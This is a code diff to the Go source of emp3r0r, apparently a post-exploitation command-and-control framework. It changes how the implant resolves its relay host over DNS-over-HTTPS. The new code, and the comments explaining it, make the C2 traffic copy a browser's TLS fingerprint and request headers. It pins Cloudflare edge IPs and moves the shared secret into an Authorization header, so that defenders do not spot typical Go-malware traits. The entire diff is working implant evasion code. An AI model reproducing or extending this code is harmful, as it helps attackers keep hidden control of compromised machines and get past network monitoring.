@@ -15,7 +15,6 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
-	"github.com/ncruces/go-dns"
 )
 
 // EstablishC2Connection connects to C2 using the configured wrapper mode.
@@ -218,29 +217,25 @@ var cfEdgeBootstrapIPs = []string{
 // to the stock resolver (plaintext system-DNS bootstrap) when no pinned
 // edge answers — e.g. if CF retires those addresses.
 func NewPinnedDoHResolver(uri string) (*net.Resolver, error) {
-	// The DoH HTTPS connection itself must share the WS channel's browser
-	// TLS fingerprint — a Go-default ClientHello from the same host would
-	// betray the mimicry (and is a classic Golang-malware tell on its own).
-	tr := &http.Transport{
-		ForceAttemptHTTP2: false, // uTLS negotiates http/1.1 (WS-like ALPN)
-		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
-			return transport.BrowserLikeTLSDial(ctx, addr, cfEdgeBootstrapIPs)
-		},
-	}
-	pinned, err := dns.NewDoHResolver(uri, dns.DoHCache(),
-		dns.DoHAddresses(cfEdgeBootstrapIPs...), dns.DoHTransport(tr))
+	// The DoH connection must share the WS channel's browser TLS
+	// fingerprint AND browser-like request headers (UA, secret via the
+	// Authorization header) — the ncruces resolver sends a bare
+	// Go-http-client UA with the secret in the URL query. Our own
+	// resolver controls the whole request.
+	pinned, err := transport.NewMimicDoHResolver(uri, cfEdgeBootstrapIPs)
 	if err == nil {
 		ctx, cancel := context.WithTimeout(context.Background(), 6*time.Second)
 		defer cancel()
 		// verify the pinned path actually works by resolving the relay host
-		// itself (pre-warms the cache for the first WS dial, too)
+		// itself
 		if host := hostOf(uri); host != "" {
 			if _, lerr := pinned.LookupHost(ctx, host); lerr == nil {
 				return pinned, nil
 			}
 		}
 	}
-	return dns.NewDoHResolver(uri, dns.DoHCache())
+	// fall back to unpinned (resolved via net.DefaultResolver)
+	return transport.NewMimicDoHResolver(uri, nil)
 }
 
 // HostOfURL extracts the host part of a URL (exported for the agent
